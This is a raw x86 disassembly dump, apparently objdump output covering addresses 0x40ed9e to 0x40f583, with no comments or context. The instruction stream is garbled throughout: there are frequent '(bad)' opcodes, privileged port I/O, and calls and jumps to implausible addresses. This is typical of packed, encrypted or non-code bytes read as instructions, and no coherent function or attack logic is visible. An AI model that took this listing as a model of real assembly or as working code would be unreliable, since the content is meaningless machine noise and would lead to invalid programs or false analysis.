  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
